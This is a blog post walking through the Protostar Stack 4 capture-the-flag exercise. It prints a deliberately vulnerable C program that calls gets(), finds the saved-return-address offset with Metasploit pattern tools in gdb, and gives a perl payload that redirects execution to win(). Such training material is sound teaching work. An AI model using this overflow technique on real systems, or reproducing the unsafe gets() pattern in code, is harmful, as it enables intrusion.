<!DOCTYPE html>
<html lang="en-US">
	<head>
		<meta content='width=device-width, initial-scale=1, maximum-scale=1' name='viewport'/>
		<link href="//fonts.googleapis.com/css?family=Raleway:400,700%7COpen+Sans:400,700,400italic" media="all" rel="stylesheet" type="text/css">
		<link href='//maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css' rel='stylesheet'/>
		<meta content='text/html; charset=UTF-8' http-equiv='Content-Type'/>
		<meta content='blogger' name='generator'/>
		<link href='https://www.mattandreko.com/favicon.ico' rel='icon' type='image/x-icon'/>
		<link href='https://www.mattandreko.com/' rel='canonical'/>
		
		
		<title>Exploit Exercises - Protostar Stack 4</title>
		<meta content='YOUR DESCRIPTION HERE' name='description'/>
		<meta content='YOUR KEYWORDS HERE' name='keywords'/>
		<meta content='Facebook App ID here' property='fb:app_id'/>
		<meta content='Facebook Admin ID here' property='fb:admins'/>
		<meta content='@username' name='twitter:site'/>
		<meta content='@username' name='twitter:creator'/>
		<link type="text/css" rel="stylesheet" href="/css/main.css" />
		<script src='https://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js' type='text/javascript'></script>
		
		<script type="text/javascript">
			var _gaq=[['_setAccount','UA-25280110-1'],['_trackPageview']];
			(function(d,t){var g=d.createElement(t),s=d.getElementsByTagName(t)[0];
			g.src=('https:'==location.protocol?'//ssl':'//www')+'.google-analytics.com/ga.js';
			s.parentNode.insertBefore(g,s)}(document,'script'));
		</script>
		
	</head>
	<body class='index'>
	
	<div class='head-wrap'>
		<div class='row' id='header-wrappers'>
			<div class='headerleft'>
				<div class='headerleft section' id='headerleft'>
					<div class='widget Header' data-version='1' id='Header1'>
						<div id='header-inner'>
							<a href='/' style='display: block'><h1 style='display:none'></h1>
								<img alt="Logo" height="55px; " id="Header1_headerimg" src="/img/logo.png" style="display: block" width="311px; ">
							</a>
						</div>
					</div>
				</div>
			</div>
			<div style='clear: both;'></div>
		</div>
	</div>
	<div class='navi-menu'>
		<div class='nav-menu section' id='Navigation Menu' name='Navigation Menu'>
			<div class='widget LinkList' data-version='1' id='LinkList100'>
				<div class='widget-content'>
					<ul id='nav' itemscope='' itemtype='http://schema.org/SiteNavigationElement'>
						<li itemprop='name'><a href='https://www.mattandreko.com/' itemprop='url'>Home</a></li>
						<li itemprop='name'><a href='https://www.mattandreko.com//categories' itemprop='url'>Categories</a></li>
						<li itemprop='name'><a href='#' itemprop='url'>Archive</a></li>
						<li itemprop='name'><a href='#' itemprop='url'>Resume</a></li>
					</ul>
				</div>
			</div>
		</div>
		<div class='top-bar-social blue section' id='header social widget' name='Top Social Widget'>
			<div class='widget LinkList' data-version='1' id='LinkList230'>
				<div class='widget-content'>
					<ul id='social'>
						
							<li><a class='facebook' href='https://www.facebook.com/mattandreko' title='facebook'></a></li>
						
						
							<li><a class='twitter' href='https://www.twitter.com/mandreko' title='twitter'></a></li>
						
						
							<li><a class='gplus' href='https://plus.google.com/mandreko' title='gplus'></a></li>
						
						
							<li><a class='linkedin' href='https://www.linkedin.com/mattandreko' title='linkedin'></a></li>
						
						
							<li><a class='stack-overflow' href='http://stackoverflow.com/story/mattandreko' title='stack-overflow'></a></li>
						
						
							<li><a class='github' href='https://www.github.com/mandreko' title='github'></a></li>
						
						
							<li><a class='instagram' href='https://www.instagram.com/mandreko' title='instagram'></a></li>
						
					</ul>
				</div>
			</div>
		</div>
		<div style='clear: both;'></div>
	</div>
	

<div id="main">
  <div id="content">
    <div>
      <article class="hentry" role="article">

        
        

        <div class="entry-content">
          
          
          
          <p>With <a href="http://exploit-exercises.com/protostar/stack4">this</a> challenge, I think things really start to get fun, and more real-world.</p>

<!-- more -->

<p>We are provided with the following C program:</p>

<pre><code>#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

void win()
{
 printf(&quot;code flow successfully changed\n&quot;);
}

int main(int argc, char **argv)
{
 char buffer[64];

 gets(buffer);
}
</code></pre>

<p>This C app will simply read a value from user input, and store it in &ldquo;buffer&rdquo;.  We then need to get it to somehow execute &ldquo;win()&rdquo;.</p>

<p>To get started, just like in the last challenge, I used objdump to find out where &ldquo;win()&rdquo; was located:</p>

<pre><code>user@protostar:/opt/protostar/bin$ objdump -d stack4
...
080483f4 &lt;win&gt;:
...
</code></pre>

<p>Because we&rsquo;re going to need to modify the EIP of this program, we need to find where it is.  You may want to think that it would be immediately after the 64 bytes of the &ldquo;buffer&rdquo; array, however this is often times extra space due to null terminators, return values, and more.  So I use some tools from the <a href="http://metasploit.com">Metasploit Framework</a> on another machine to find the EIP.</p>

<p>First, I generate a unique string, using the pattern_create tool:</p>

<pre><code>mandreko@li225-134:/opt/framework-4.0.0/msf3/tools$ ./pattern_create.rb 128
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae
</code></pre>

<p>Then I execute the vulnerable program in gdb, feeding it the unique string to the input:</p>

<pre><code>user@protostar:/opt/protostar/bin$ gdb --quiet ./stack4
Reading symbols from /opt/protostar/bin/stack4...done.
(gdb) run
Starting program: /opt/protostar/bin/stack4
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae

Program received signal SIGSEGV, Segmentation fault.
0x63413563 in ?? ()
</code></pre>

<p>Now I know that the EIP contains the value 0x63413563.  I can go back to the Metasploit tools and run the pattern_offset tool to tell me the offset of the EIP:</p>

<pre><code>mandreko@li225-134:/opt/framework-4.0.0/msf3/tools$ ./pattern_offset.rb 0x63413563
76
</code></pre>

<p>This tells me that unlike the 64 characters I would have thought, it&rsquo;s actually offset by 76 characters.  So now we just have to get the address of &ldquo;win()&rdquo; (0x080483f4) into the EIP at 76 bytes offset:</p>

<pre><code>user@protostar:/opt/protostar/bin$ perl -e 'print &quot;A&quot;x76 . &quot;\xf4\x83\x04\x08&quot;' | ./stack4
code flow successfully changed
Segmentation fault
</code></pre>

<p>There you have it.  We get the execution from &ldquo;win()&rdquo;.</p>

        </div>
        
      </article>
    </div>
    
  </div>
</div>

		
		<div id='w2t_footer'>
			<div class='w2t-copy-container row'>
				<div class='w2t_footer_copyright'>
					Copyright &copy;
					<script type='text/javascript'>
						var creditsyear = new Date();
						document.write(creditsyear.getFullYear());
					</script>
					Matt Andreko. All Rights Reserved
				</div>
			</div>
		</div>
		
		
			
				<script type="text/javascript">
	var disqus_shortname = 'mattandreko';
	var disqus_script = 'count.js';

	(function () {
		var dsq = document.createElement('script'); 
		dsq.type = 'text/javascript'; 
		dsq.async = true;
		dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
		(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
	}());
</script>
			
		
	</body>
</html>
